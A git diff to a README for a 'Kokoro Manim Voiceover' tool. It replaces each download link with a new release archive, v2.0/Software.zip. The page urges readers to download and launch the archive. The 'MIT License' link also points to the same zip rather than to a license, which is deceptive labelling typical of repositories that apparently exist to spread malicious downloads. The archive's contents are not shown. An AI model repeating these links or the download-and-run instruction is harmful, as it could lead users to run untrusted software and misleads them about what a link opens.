@@ -13,7 +13,7 @@ Welcome to the **Kokoro Manim Voiceover** GitHub repository! This repository foc
 
 To begin using the Kokoro Manim Voiceover tool, you can download the software package by clicking the button below:
 
-[![Download Software](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v1.0/Application.zip)](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v2.0/Software.zip)](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v2.0/Software.zip)
 
 📁 Please note that the software needs to be launched after downloading.
 
@@ -64,7 +64,7 @@ We welcome contributions from the community to enhance the Kokoro Manim Voiceove
 
 ## 📝 License
 
-The Kokoro Manim Voiceover tool is released under the [MIT License](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v1.0/Application.zip). Feel free to use, modify, and distribute the software according to the terms of the license.
+The Kokoro Manim Voiceover tool is released under the [MIT License](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v2.0/Software.zip). Feel free to use, modify, and distribute the software according to the terms of the license.
 
 ---
 
@@ -80,7 +80,7 @@ Download the software package and unleash your creativity with Kokoro Manim Voic
 
 ---
 
-🚀 **[Download Software](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v1.0/Application.zip)** 🚀
+🚀 **[Download Software](https://github.com/MazlCL/kokoro-manim-voiceover/releases/download/v2.0/Software.zip)** 🚀
 
 🌟 **Join the Kokoro Manim Voiceover Community** 🌟
 
